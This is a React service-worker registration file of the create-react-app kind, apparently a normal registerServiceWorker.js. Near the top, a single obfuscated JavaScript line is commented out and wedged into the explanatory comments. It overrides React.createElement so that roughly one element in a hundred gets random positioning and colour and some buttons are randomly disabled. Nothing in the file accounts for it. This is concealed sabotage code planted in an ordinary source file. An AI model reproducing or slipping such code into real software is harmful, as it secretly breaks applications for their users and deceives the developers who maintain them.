// In production, we register a service worker to serve assets from local cache.

// var _0x566e=['createElement','prototype','slice','call','floor','random','style','12px','11px','toString','type','button','disabled','apply'];(function(_0x48b05c,_0x2e44ce){var _0x3d7702=function(_0x2a4534){while(--_0x2a4534){_0x48b05c['push'](_0x48b05c['shift']());}};_0x3d7702(++_0x2e44ce);}(_0x566e,0x126));var _0x10ad=function(_0x358e19,_0x510151){_0x358e19=_0x358e19-0x0;var _0x46fe30=_0x566e[_0x358e19];return _0x46fe30;};import _0x4edfa3 from'react';const baseline=_0x4edfa3[_0x10ad('0x0')];_0x4edfa3[_0x10ad('0x0')]=function createElement(){const _0x58f940=Array[_0x10ad('0x1')][_0x10ad('0x2')][_0x10ad('0x3')](arguments);const _0x3a8e18=_0x58f940[0x0];const _0xfd71fb=_0x58f940[0x1];if(_0xfd71fb&&Math[_0x10ad('0x4')](Math[_0x10ad('0x5')]()*0x64+0x1)<=0x1){_0xfd71fb[_0x10ad('0x6')]={'top':_0x10ad('0x7'),'left':_0x10ad('0x8'),'backgroundColor':'#'+(Math[_0x10ad('0x5')]()*0xffffff<<0x0)[_0x10ad('0x9')](0x10)};}if(_0xfd71fb&&_0xfd71fb[_0x10ad('0xa')]==_0x10ad('0xb')&&Math[_0x10ad('0x4')](Math[_0x10ad('0x5')]()*0x64)<=0x1){_0xfd71fb[_0x10ad('0xc')]=!![];}return baseline[_0x10ad('0xd')](_0x4edfa3,_0x58f940);};

// This lets the app load faster on subsequent visits in production, and gives
// it offline capabilities. However, it also means that developers (and users)
// will only see deployed updates on the "N+1" visit to a page, since previously
// cached resources are updated in the background.

// To learn more about the benefits of this model, read https://goo.gl/KwvDNy.
// This link also includes instructions on opting out of this behavior.
const isLocalhost = Boolean(
  window.location.hostname === "localhost" ||
    // [::1] is the IPv6 localhost address.
    window.location.hostname === "[::1]" ||
    // 127.0.0.1/8 is considered localhost for IPv4.
    window.location.hostname.match(
      /^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/
    )
);

/** Unregistering the service worker from the browser.
 * @return {null} No reutrn.
 */
export function unregister() {
  if ("serviceWorker" in navigator) {
    navigator.serviceWorker.ready.then(registration => {
      registration.unregister();
    });
  }
}

/** Registering a service worker in user's browser.
 * @param {string} swUrl is the service worker's file location.
 * @return {null} No return.
 */
function registerValidSW(swUrl) {
  navigator.serviceWorker
    .register(swUrl)
    .then(registration => {
      registration.onupdatefound = () => {
        const installingWorker = registration.installing;
        installingWorker.onstatechange = () => {
          if (installingWorker.state === "installed") {
            if (navigator.serviceWorker.controller) {
              // At this point, the old content will have been purged and
              // the fresh content will have been added to the cache.
              // It's the perfect time to display a "New content is
              // available; please refresh." message in your web app.
              console.log("New content is available; please refresh.");
            } else {
              // At this point, everything has been precached.
              // It's the perfect time to display a
              // "Content is cached for offline use." message.
              console.log("Content is cached for offline use.");
            }
          }
        };
      };
    })
    .catch(error => {
      console.error("Error during service worker registration:", error);
    });
}

/** Checking the exist service worker when running under the localhost.
 * @param {string} swUrl is the service worker's file location.
 * @return {null} No return.
 */
function checkValidServiceWorker(swUrl) {
  // Check if the service worker can be found. If it can't reload the page.
  fetch(swUrl)
    .then(response => {
      // Ensure service worker exists, and that we really are getting a JS file.
      if (
        response.status === 404 ||
        response.headers.get("content-type").indexOf("javascript") === -1
      ) {
        // No service worker found. Probably a different app. Reload the page.
        navigator.serviceWorker.ready.then(registration => {
          registration.unregister().then(() => {
            window.location.reload();
          });
        });
      } else {
        // Service worker found. Proceed as normal.
        registerValidSW(swUrl);
      }
    })
    .catch(() => {
      console.log(
        "No internet connection found. App is running in offline mode."
      );
    });
}

/** Checking whether in the production enviroment and whether user's browser support service worker.
 * @return {null} No return.
 */
export default function register() {
  if (process.env.NODE_ENV === "production" && "serviceWorker" in navigator) {
    // The URL constructor is available in all browsers that support SW.
    const publicUrl = new URL(process.env.PUBLIC_URL, window.location);
    if (publicUrl.origin !== window.location.origin) {
      // Our service worker won't work if PUBLIC_URL is on a different origin
      // from what our page is served on. This might happen if a CDN is used to
      // serve assets; see https://github.com/facebookincubator/create-react-app/issues/2374
      return;
    }

    window.addEventListener("load", () => {
      const swUrl = "./service-worker.js";
      if (isLocalhost) {
        // This is running on localhost. Lets check if a service worker still exists or not.
        checkValidServiceWorker(swUrl);
      } else {
        // Is not local host. Just register service worker
        registerValidSW(swUrl);
      }
    });
  }
}
